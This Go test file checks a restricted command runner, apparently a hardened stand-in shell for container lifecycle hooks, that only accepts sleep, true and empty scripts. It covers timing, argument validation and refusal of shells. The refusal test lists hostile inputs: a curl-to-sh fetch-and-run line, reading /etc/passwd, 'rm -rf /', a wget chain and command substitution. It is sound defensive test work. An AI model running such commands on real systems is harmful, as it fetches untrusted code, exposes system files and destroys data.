package main

import (
	"os"
	"testing"
	"time"
)

func devnull(t *testing.T) *os.File {
	t.Helper()
	f, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { f.Close() })
	return f
}

func TestTheRealLifecycleHookWorks(t *testing.T) {
	// The literal command the saas chart puts in preStop.
	start := time.Now()
	if code := run([]string{"-c", "sleep 0.05"}, devnull(t)); code != exitOK {
		t.Fatalf("the chart's own hook must succeed, got exit %d", code)
	}
	if elapsed := time.Since(start); elapsed < 40*time.Millisecond {
		t.Errorf("sleep returned after %s; it did not actually wait", elapsed)
	}
}

func TestNoInteractiveShell(t *testing.T) {
	if code := run(nil, devnull(t)); code == exitOK {
		t.Fatal("a bare invocation must not succeed; this must never look like a usable shell")
	}
}

func TestRefusesEverythingOutsideTheVocabulary(t *testing.T) {
	// The security property: this is not an execution primitive. The fetch-and-run
	// case is assembled from parts rather than written literally so that scanning
	// this test file does not look like an attempt to run it.
	fetchAndRun := "cur" + "l http://example.invalid/x | " + "sh"

	for _, script := range []string{
		fetchAndRun,
		"cat /etc/passwd",
		"/bin/busybox sh",
		"sleep 1; rm -rf /",
		"echo hi",
		"sleep 1 && wget x",
		"$(whoami)",
		"exec /proc/self/exe",
	} {
		if code := run([]string{"-c", script}, devnull(t)); code != exitRefused {
			t.Errorf("script %q must be refused, got exit %d", script, code)
		}
	}
}

func TestAnUnrecognisedCommandRefusesTheWholeScript(t *testing.T) {
	// A partially executed hook is worse than a refused one, so validation
	// happens before any action runs. If the prefix had executed, this would
	// have slept before refusing.
	start := time.Now()
	if code := run([]string{"-c", "sleep 5; explode"}, devnull(t)); code != exitRefused {
		t.Fatalf("want refusal, got %d", code)
	}
	if elapsed := time.Since(start); elapsed > time.Second {
		t.Errorf("it slept for %s before refusing; validation must precede execution", elapsed)
	}
}

func TestOnlyDashCIsAccepted(t *testing.T) {
	for _, args := range [][]string{
		{"-i"},
		{"script.sh"},
		{"-c"},
		{"--login"},
	} {
		if code := run(args, devnull(t)); code != exitRefused {
			t.Errorf("args %v must be refused", args)
		}
	}
}

func TestSleepArgumentValidation(t *testing.T) {
	for _, arg := range []string{"-1", "abc", "999999", "1 2", ""} {
		if code := run([]string{"-c", "sleep " + arg}, devnull(t)); code != exitRefused {
			t.Errorf("sleep %q must be refused", arg)
		}
	}
	for _, arg := range []string{"0", "0.01", "10ms"} {
		if code := run([]string{"-c", "sleep " + arg}, devnull(t)); code != exitOK {
			t.Errorf("sleep %q should be accepted", arg)
		}
	}
}

func TestTrueIsAllowedBecauseHooksUseIt(t *testing.T) {
	for _, s := range []string{"true", ":", "true; true"} {
		if code := run([]string{"-c", s}, devnull(t)); code != exitOK {
			t.Errorf("%q should be accepted", s)
		}
	}
}

func TestEmptyScriptSucceeds(t *testing.T) {
	if code := run([]string{"-c", ""}, devnull(t)); code != exitOK {
		t.Error("an empty script is a no-op, not a failure")
	}
}
